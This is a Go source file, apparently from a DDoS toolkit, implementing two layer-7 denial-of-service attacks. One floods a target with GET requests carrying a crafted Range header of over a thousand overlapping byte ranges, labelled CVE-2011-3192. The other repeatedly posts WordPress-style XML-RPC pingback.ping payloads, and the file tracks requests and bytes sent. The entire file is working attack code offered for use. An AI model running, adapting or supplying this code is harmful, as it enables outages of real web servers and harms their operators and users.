package layer7

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// AdvancedAttack implements complex HTTP attacks
type AdvancedAttack struct {
	*BaseAttack
	Method string
}

func NewAdvancedAttack(cfg *core.AttackConfig, method string) *AdvancedAttack {
	return &AdvancedAttack{
		BaseAttack: NewBaseAttack(cfg),
		Method:     method,
	}
}

func (a *AdvancedAttack) Attack(ctx context.Context) error {
	switch a.Method {
	case "XMLRPC":
		return a.executeXMLRPC(ctx)
	case "APACHE":
		return a.executeAPACHE(ctx)
	default:
		return nil
	}
}

func (a *AdvancedAttack) executeAPACHE(ctx context.Context) error {
	for i := 0; i < a.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequest("GET", a.Config.Target, nil)
		if err != nil {
			continue
		}

		a.AddHeaders(req)

		// Build range header (CVE-2011-3192)
		ranges := []string{"bytes=0-"}
		for j := 1; j < 1024; j++ {
			ranges = append(ranges, fmt.Sprintf("5-%d", j))
		}
		req.Header.Set("Range", strings.Join(ranges, ","))

		resp, err := a.Client.Do(req)
		if err == nil {
			a.Config.RequestsSent.Add(1)
			a.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

func (a *AdvancedAttack) executeXMLRPC(ctx context.Context) error {
	for i := 0; i < a.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		xmlPayload := fmt.Sprintf(`<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>`,
			utils.RandString(64),
			utils.RandString(64))

		req, err := http.NewRequest("POST", a.Config.Target, strings.NewReader(xmlPayload))
		if err != nil {
			continue
		}

		a.AddHeaders(req)
		req.Header.Set("Content-Type", "application/xml")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(xmlPayload)))
		req.Header.Set("X-Requested-With", "XMLHttpRequest")

		resp, err := a.Client.Do(req)
		if err == nil {
			a.Config.RequestsSent.Add(1)
			a.Config.BytesSent.Add(int64(EstimateRequestSize(req) + len(xmlPayload)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}
